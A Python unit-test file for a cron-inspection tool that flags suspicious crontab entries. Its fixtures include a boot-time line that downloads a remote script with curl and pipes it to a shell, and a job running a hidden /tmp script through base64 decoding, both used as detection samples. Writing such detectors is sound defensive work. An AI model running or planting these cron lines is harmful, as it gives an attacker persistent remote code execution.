import tempfile
import unittest
from pathlib import Path

from main import inspect_cron_text, inspect_path


class CronWatchTests(unittest.TestCase):
    def test_flags_reboot_and_remote_shell_pipe(self):
        sample = "@reboot curl https://example.invalid/task.sh | sh\n"
        results = inspect_cron_text(sample, "sample")
        kinds = {item["type"] for item in results[0]["indicators"]}
        self.assertIn("reboot_persistence", kinds)
        self.assertIn("remote_download_to_shell", kinds)

    def test_ignores_comments_and_environment_lines(self):
        sample = "# @reboot do-not-run\nPATH=/usr/bin:/bin\n0 2 * * * /usr/bin/backup\n"
        self.assertEqual(inspect_cron_text(sample, "sample"), [])

    def test_temporary_and_encoded_payload_indicators(self):
        sample = "*/5 * * * * /tmp/.cache/run.sh | base64 --decode\n"
        results = inspect_cron_text(sample, "sample")
        kinds = {item["type"] for item in results[0]["indicators"]}
        self.assertIn("temporary_directory_execution", kinds)
        self.assertIn("encoded_payload", kinds)

    def test_directory_is_scanned_recursively(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "cronfile").write_text("@reboot /usr/local/bin/check\n", encoding="utf-8")
            nested = root / "nested"
            nested.mkdir()
            (nested / "job").write_text("0 3 * * * /usr/bin/backup\n", encoding="utf-8")
            report = inspect_path(root)
            self.assertEqual(report["files_reviewed"], 2)
            self.assertEqual(report["review_item_count"], 1)

    def test_missing_path_is_rejected(self):
        with tempfile.TemporaryDirectory() as tmp:
            missing = Path(tmp) / "missing"
            with self.assertRaises(FileNotFoundError):
                inspect_path(missing)


if __name__ == "__main__":
    unittest.main()
